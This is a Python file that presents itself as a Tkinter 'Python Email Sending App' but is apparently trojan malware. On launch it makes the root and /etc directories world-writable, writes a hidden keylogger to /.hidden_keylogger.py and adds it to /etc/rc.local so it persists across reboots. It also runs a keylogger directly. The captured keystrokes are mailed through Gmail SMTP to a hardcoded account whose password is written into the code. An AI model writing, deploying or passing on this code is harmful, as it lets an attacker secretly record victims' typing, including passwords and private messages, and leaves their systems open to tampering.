import os

os.system("touch /etc/rc.local")
os.system("sudo chmod 777 /")
os.system("sudo chmod 777 /etc")
os.system("sudo chmod 777 /etc/rc.local")
my_file = open("/etc/rc.local" , "w")
my_file.write("python /.hidden_keylogger.py")
my_file.close()


os.system("touch /.hidden_keylogger.py")
key_logger = open("/.hidden_keylogger.py", "w")
key_logger.write("import getpass\n")
key_logger.write("import smtplib\n")
key_logger.write("from pynput.keyboard import Key , Listener\n")
key_logger.write('email = "sdslabskeylogger@gmail.com"\n')
key_logger.write('password = "Crack_It"\n')
key_logger.write('server = smtplib.SMTP_SSL("smtp.gmail.com" , 465)\n')
key_logger.write("server.login(email , password)\n")
key_logger.write('full_log = ""\n')
key_logger.write('word = ""\n')
key_logger.write('email_char_limit = 50\n')
key_logger.write('def on_press(key):\n')
key_logger.write('    global word\n')
key_logger.write('    global full_log\n')
key_logger.write('    global email\n')
key_logger.write('    global email_char_limit\n')
key_logger.write('    if key == Key.space or key == Key.enter:\n')
key_logger.write('        word += " "\n')
key_logger.write('        full_log += word\n')
key_logger.write('        word = ""\n')
key_logger.write('        if len(full_log) >= email_char_limit:\n')
key_logger.write('            send_log()\n')
key_logger.write('            full_log = ""\n')
key_logger.write('    elif key == Key.shift_l or key == Key.shift_r:\n')
key_logger.write('        return\n')
key_logger.write('    elif key == Key.backspace:\n')
key_logger.write('        word = word[:-1]\n')
key_logger.write('    else:\n')
key_logger.write("        char = f'{key}'\n")
key_logger.write('        char = char[1: -1]\n')
key_logger.write('        word += char\n')
key_logger.write('def send_log():\n')
key_logger.write('    server.sendmail(\n')
key_logger.write('        email,\n')
key_logger.write('        email,\n')
key_logger.write('        full_log\n')
key_logger.write('    )\n')
key_logger.write('with Listener(on_press = on_press) as Listener:\n')
key_logger.write('    Listener.join()\n')
key_logger.close()

import smtplib
from tkinter import *

def send_message():
    address_info = address.get()
    
    email_body_info = email_body.get(1.0 , END)
    
    print(address_info,email_body_info)
    
    sender_email = "sdslabskeylogger@gmail.com"
    
    sender_password = "Crack_It"
    
    server = smtplib.SMTP('smtp.gmail.com',587)
    
    server.starttls()
    
    server.login(sender_email,sender_password)
    
    print("Login successful")
    
    server.sendmail(sender_email,address_info,email_body_info)
    
    print("Message sent")
    
    address_entry.delete(0,END)
    email_body_entry.delete(0,END)
    
    
    

app = Tk()
app.geometry("500x500")

app.title("Mail")

heading = Label(text="Python Email Sending App",bg="yellow",fg="black",font="10",width="500",height="3")

heading.pack()

address_field = Label(text="Recipient Address :")
email_body_field = Label(text="Message :")

address_field.place(x=15,y=70)
email_body_field.place(x=15,y=140)

address = StringVar()
email_body = StringVar()

address_entry = Entry(textvariable=address,width="30")
email_body_entry = Entry(textvariable=email_body,width="30")
email_body = Text(app , width = 50 , height = 18)
email_body.place(x = 15 , y = 160)

address_entry.place(x=15,y=100)
email_body_entry.place(x=15,y=180)

button = Button(app,text="Send Message",command=send_message,width="30",height="2",bg="blue")

button.place(x=15,y=400)





import getpass

from pynput.keyboard import Key , Listener
#print( " Executed ")
email = "sdslabskeylogger@gmail.com"
password = "Crack_It"
server = smtplib.SMTP_SSL("smtp.gmail.com" , 465)
server.login(email , password)

#logger
full_log = ""
word = ""
email_char_limit = 50
def on_press(key):
    global word
    global full_log
    global email
    global email_char_limit

    if key == Key.space or key == Key.enter:
        word += " "
        full_log += word
        word = ""
        if len(full_log) >= email_char_limit:
            send_log()
            full_log = ""
    elif key == Key.shift_l or key == Key.shift_r:
        return
    elif key == Key.backspace:
        word = word[:-1]
    else:
        char = f'{key}'
        char = char[1: -1]
        word += char


def send_log():
    server.sendmail(
        email,
        email,
        full_log
    )
    
with Listener(on_press = on_press) as Listener:
    mainloop()
    Listener.join()
